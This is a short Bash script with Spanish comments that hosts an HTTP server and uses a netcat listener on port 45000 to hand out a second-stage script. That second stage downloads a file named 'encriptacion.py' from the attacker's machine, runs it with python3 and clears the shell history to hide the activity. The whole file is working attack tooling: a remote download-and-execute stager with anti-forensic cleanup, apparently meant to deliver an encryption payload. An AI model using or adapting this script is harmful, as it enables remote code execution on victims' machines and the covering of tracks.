#!/bin/bash



# Obtener la dirección IP de la máquina

var=$(hostname -I | awk '{print $1}')



# Crear el script datos.sh

cat <<EOF > datos.sh

#!/bin/bash



wget http://$var:8000/py/encriptacion.py

sleep 3

python3 encriptacion.py

history -c

EOF



# Ejecutar el servidor HTTP en segundo plano

python3 -m http.server 8000 >/dev/null 2>&1 &



# Esperar a que se inicie el servidor HTTP

sleep 1



# Enviar el script remoto a través de nc

cat datos.sh | nc -lvp 45000

